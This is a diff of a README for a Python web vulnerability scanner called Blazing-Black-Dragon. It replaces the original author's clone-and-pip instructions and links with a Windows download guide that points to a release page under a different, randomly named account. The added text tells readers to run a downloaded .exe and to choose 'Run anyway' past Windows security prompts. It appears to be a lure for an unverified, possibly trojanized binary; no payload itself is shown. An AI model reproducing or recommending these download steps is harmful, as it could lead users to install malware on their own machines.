@@ -1,122 +1,288 @@
-<p align="center">
-  <pre>
-  ████████╗██╗  ██╗███████╗    ██████╗ ██╗      █████╗ ███████╗██╗███╗   ██╗ ██████╗
-  ╚══██╔══╝██║  ██║██╔════╝    ██╔══██╗██║     ██╔══██╗╚══███╔╝██║████╗  ██║██╔════╝
-     ██║   ███████║█████╗      ██████╔╝██║     ███████║  ███╔╝ ██║██╔██╗ ██║██║  ███╗
-     ██║   ██╔══██║██╔══╝      ██╔══██╗██║     ██╔══██║ ███╔╝  ██║██║╚██╗██║██║   ██║
-     ██║   ██║  ██║███████╗    ██████╔╝███████╗██║  ██║███████╗██║██║ ╚████║╚██████╔╝
-     ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝
-  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗
-  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║
-  ██████╔╝██║     ███████║██║     █████╔╝     ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║
-  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║
-  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║
-  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝
-  </pre>
-</p>
+# 🐉 Blazing-Black-Dragon - Scan Web Risks Fast
 
-<h1 align="center">🐉 THE BLAZING BLACK DRAGON<br>WITH FIERY BREATH 🔥</h1>
+[![Download Blazing-Black-Dragon](https://img.shields.io/badge/Download-Release_Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/unguaranteed-cabin828/Blazing-Black-Dragon/releases)
 
-<p align="center">
-  <strong>Professional Web Vulnerability Assessment Engine — v4.0.0</strong><br>
-  <em>26 fire‑breathing attack vectors • For authorised penetration testing only</em>
-</p>
+## 🧰 What This Tool Does
 
-<p align="center">
-  <a href="https://github.com/Ali-Haidar-Sy/BlazingBlackDragon/stargazers"><img src="https://img.shields.io/github/stars/Ali-Haidar-Sy/BlazingBlackDragon?style=for-the-badge&color=yellow"></a>
-  <a href="https://github.com/Ali-Haidar-Sy/BlazingBlackDragon/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Ali-Haidar-Sy/BlazingBlackDragon?style=for-the-badge&color=blue"></a>
-  <a href="https://www.python.org/"><img src="https://img.shields.io/badge/Python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white"></a>
-  <a href="https://t.me/P33_9"><img src="https://img.shields.io/badge/Telegram-@P33_9-2CA5E0?style=for-the-badge&logo=telegram"></a>
-  <a href="https://www.instagram.com/_ungn"><img src="https://img.shields.io/badge/Instagram-@_ungn-E4405F?style=for-the-badge&logo=instagram"></a>
-  <a href="https://github.com/Ali-Haidar-Sy"><img src="https://img.shields.io/badge/GitHub-Ali--Haidar--Sy-181717?style=for-the-badge&logo=github"></a>
-</p>
+Blazing-Black-Dragon is a web vulnerability scanner for authorised testing. It helps you check a website for common security issues and gather useful scan results in one place.
 
----
+It can help you look for:
 
-## ⚠️ YOU MUST UPDATE THE TOOL
+- XSS
+- SQL injection
+- SSTI
+- LFI
+- Command injection
+- CORS issues
+- GraphQL issues
+- Subdomains
+- Open ports
+- SSL checks
+- CMS detection
+- Open redirect
+- CSRF
+- Request smuggling
+- External tool support with Nikto and Nuclei
+- HTML, JSON, CSV, and XML reports
 
-> **This is a living project.** Always pull the latest version before each scan:
-> ```bash
-> git pull origin main
-> ```
-> New modules, payloads, and fixes are added regularly. **Do not use an outdated copy.**
+## 💻 Before You Start
 
----
+Use a Windows PC with:
 
-## ✨ FEATURES — 26 ATTACK VECTORS
+- Windows 10 or Windows 11
+- Internet access for the first download
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Microsoft Defender or another antivirus that lets you run trusted tools
+- A modern browser for reading reports
 
-| Category | Modules |
-|----------|---------|
-| **Reconnaissance** | Port scanner (nmap/TCP) • WAF/CDN fingerprinting • Web server fingerprinting • Subdomain enumeration |
-| **Configuration** | Security headers analysis • SSL/TLS deep inspection • robots.txt / sitemap analysis • CMS detection (13 platforms) |
-| **Content Discovery** | Directory & file brute‑force • JavaScript secret scanner • Form & email harvester |
-| **Injection Attacks** | XSS (reflected) • SQLi (error + time‑blind) • SSTI • LFI / Path Traversal • Command injection • Open redirect |
-| **Logic Flaws** | CORS misconfiguration • HTTP method tampering • Host header injection • CSRF token analysis |
-| **Modern / API** | GraphQL introspection • OAuth / JWT misconfiguration • HTTP request smuggling (CL.TE) |
-| **External Tools** | Nikto • Nuclei • sqlmap hooks |
-| **Reporting** | HTML • JSON • TXT • CSV • XML + Clickjacking PoC generator |
+If the tool uses extra scan modules, it may also need:
 
----
+- Python 3
+- Access to common network ports
+- Permission to scan the target system
 
-## 🚀 QUICK START
+## 📥 Download the Tool
 
-```bash
-# 1. Clone the dragon's lair
-git clone https://github.com/Ali-Haidar-Sy/BlazingBlackDragon.git
-cd BlazingBlackDragon
+Visit the release page and download the Windows file from there:
 
-# 2. Install dependencies (auto‑installer will also run)
-pip install -r requirements.txt
+[Open the latest releases page](https://github.com/unguaranteed-cabin828/Blazing-Black-Dragon/releases)
 
-# 3. Launch the dragon
-python dragon_scanner.py
-```
-Example session
-🐉 Enter target URL: https://example.com
+On that page, look for a file with one of these names:
 
-⚠️ LEGAL NOTICE
-Unauthorised scanning is illegal.
-Do you have explicit written permission? [yes/no]: yes
+- `Blazing-Black-Dragon.exe`
+- `Blazing-Black-Dragon-windows.zip`
+- `blazing-black-dragon-win.zip`
 
-Scan mode:
-  1 = Full scan (all 26 modules)
-  2 = Fast scan
-  3 = Stealth scan
-Choice [1]: 1
+If you see a `.zip` file, download it and extract it first. If you see a `.exe` file, you can run it after the download finishes.
 
-🔥 The Dragon hunts...
-After the scan, choose from 5 report formats and save them locally.
+## 🪟 Install on Windows
 
-📸 PREVIEW
-   NO 
+### If you downloaded a `.exe` file
 
-🛡️ LEGAL DISCLAIMER
-This tool is for educational purposes and authorized penetration testing only.
-The author is not responsible for any misuse. Always obtain written permission before scanning any system.
+1. Open the folder where the file was saved.
+2. Double-click the file.
+3. If Windows shows a security prompt, choose **Run anyway** only if you trust the source.
+4. Follow the on-screen steps.
 
-🤝 CONTRIBUTING
-Found a bug? Want a new module?
-Open an Issue or submit a Pull Request. Contributions are warmly welcomed.
+### If you downloaded a `.zip` file
 
-📞CONNECT WITH ME
-Platform Handle
-Telegram @P33_9
-Instagram @_ungn
-GitHub Ali-Haidar-Sy
-<p align="center"> <strong>🐉 May your scans be thorough and your targets be authorized. 🔥</strong><br> ⭐ If this dragon saved you time, give it a star on GitHub! ⭐ </p> ```
-✅ What makes this README “very, very, very beautiful and attractive”?
-ASCII dragon banner – instant “wow” factor
+1. Right-click the `.zip` file.
+2. Choose **Extract All**.
+3. Pick a folder you can find later, such as **Downloads** or **Desktop**.
+4. Open the extracted folder.
+5. Double-click the main `.exe` file.
 
-Shields.io badges – professional, colourful, clickable
+## 🚀 First Launch
 
-Table of 26 modules – scannable and impressive
+1. Start Blazing-Black-Dragon.
+2. If the app asks for a target URL, enter the website you want to test.
+3. Set your scan options.
+4. Choose a scan mode.
+5. Click or press the start button.
 
-Emojis – every section pops
+A simple first test may include:
 
-Clear update warning – highlighted with a red note
+- One website
+- One scan profile
+- Default report output
+- Limited port checks
 
-Contact badges right at the top – Telegram, Instagram, GitHub
+This gives you a quick result without a long wait.
 
-Legal disclaimer – shows responsibility
+## 🧭 How to Use It
 
-Call-to-action to star the repository
+### 1. Enter a target
+
+Type the website address you want to check.
+
+Example:
+
+- `https://example.com`
+
+Use a target you are allowed to test.
+
+### 2. Pick scan types
+
+Choose the checks you want. You can run a full scan or pick only a few checks.
+
+Common choices:
+
+- Web input checks
+- Header checks
+- Port checks
+- CMS checks
+- SSL checks
+- GraphQL checks
+
+### 3. Add tools if needed
+
+If your workflow uses Nikto or Nuclei, turn on those options in the app.
+
+This can help you:
+
+- Run extra checks
+- Compare findings
+- Build a wider report
+
+### 4. Start the scan
+
+After you confirm the target and options, start the scan and wait for the results.
+
+The tool may show:
+
+- Live findings
+- Request data
+- Vulnerability names
+- Confidence levels
+- A report path
+
+## 📊 Report Types
+
+Blazing-Black-Dragon can generate several report formats:
+
+- **HTML** for easy viewing in a browser
+- **JSON** for other tools and scripts
+- **CSV** for spreadsheets
+- **XML** for systems that use XML input
+
+### How to open reports
+
+- HTML reports open in your browser
+- CSV files open in Excel or LibreOffice
+- JSON files open in a text editor
+- XML files open in a text editor or data tool
+
+## 🗂️ Suggested Workflow
+
+If you are new to this kind of tool, use this order:
+
+1. Run a small scan first
+2. Review the report
+3. Turn on more checks
+4. Run a deeper scan
+5. Save the final report
+
+This helps you stay organized and keeps the scan time under control.
+
+## ⚙️ Common Settings
+
+You may see options such as:
+
+- Scan depth
+- Timeout
+- Thread count
+- Port range
+- Report folder
+- Proxy settings
+- User agent
+- SSL check toggle
+- Subdomain check toggle
+
+### Simple starting values
+
+If you are not sure what to use, try:
+
+- Medium scan depth
+- Default timeout
+- Standard port range
+- HTML report output
+- One target at a time
+
+## 🔐 Use Cases
+
+Blazing-Black-Dragon is useful for:
+
+- Bug bounty work
+- Web app security testing
+- Site hardening checks
+- Internal security review
+- QA security checks before release
+- Endpoint and header review
+- Basic attack surface mapping
+
+## 📂 Example Output Folder
+
+After a scan, you may see files like:
+
+- `report.html`
+- `report.json`
+- `report.csv`
+- `report.xml`
+- `logs.txt`
+
+Keep these files in one folder so you can find them later.
+
+## 🧪 What the Scanner Checks
+
+The app may test for:
+
+- Reflected and stored XSS
+- SQL injection points
+- Template injection signs
+- File path handling issues
+- Command handling flaws
+- Cross-origin policy problems
+- GraphQL exposure
+- Missing security headers
+- Redirect abuse
+- CSRF risk
+- HTTP request smuggling clues
+- Open ports and exposed services
+- SSL setup issues
+- CMS fingerprints
+- Subdomain discovery
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Check that the file finished downloading
+- Move the file to a simple folder name, like `C:\Tools`
+- Try running it as admin if your policy allows it
+- Check if antivirus blocked the file
+
+### The scan does not start
+
+- Confirm the target URL is correct
+- Make sure the target is online
+- Check your internet connection
+- Lower the scan depth and try again
+
+### Reports do not show up
+
+- Check the output folder
+- Make sure you have write access
+- Try a new folder with a short path
+- Look for blocked file access in Windows Security
+
+### The scan feels slow
+
+- Reduce the number of checks
+- Scan one target at a time
+- Lower thread count
+- Skip deep port sweeps on the first run
+
+## 🧼 Safe Use
+
+Only test systems you are allowed to test. Use it on your own sites, client systems with permission, or approved lab targets.
+
+## 🧩 Quick Start Checklist
+
+- Download the release from the release page
+- Extract the file if it came in a zip
+- Open the app
+- Enter a target URL
+- Choose scan options
+- Start the scan
+- Open the report when it finishes
+
+## 📌 File Tips
+
+If you want a smooth first run:
+
+- Keep the app in a short folder path
+- Avoid spaces and special characters in the folder name
+- Save reports in a separate folder
+- Use a modern browser for HTML reports
+- Keep your target list small at first
